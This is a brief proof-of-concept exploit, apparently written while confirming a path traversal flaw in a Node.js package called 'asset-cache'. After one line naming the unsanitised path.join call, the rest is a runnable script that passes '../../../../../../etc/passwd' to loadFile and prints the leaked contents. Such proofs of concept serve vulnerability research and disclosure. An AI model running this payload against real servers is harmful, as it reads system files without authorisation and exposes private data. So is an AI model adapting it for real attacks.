Confirmed: `loadFile` builds the path with `path.join(config.dir, filename)` without sanitizing `../` sequences — classic path traversal.

```javascript
const assetServer = require("./node_modules/asset-cache");

// Point cwd to a subdirectory so traversal has to escape it
assetServer.setCwd(__dirname + "/public");

// Path traversal: escape config.dir to read an arbitrary file, e.g. /etc/passwd
assetServer.loadFile("../../../../../../etc/passwd", null, function (err, data, cached, etag) {
  if (err) {
    console.error("Error:", err);
    return;
  }
  console.log("Leaked file contents via path traversal:\n" + data.toString());
});
```
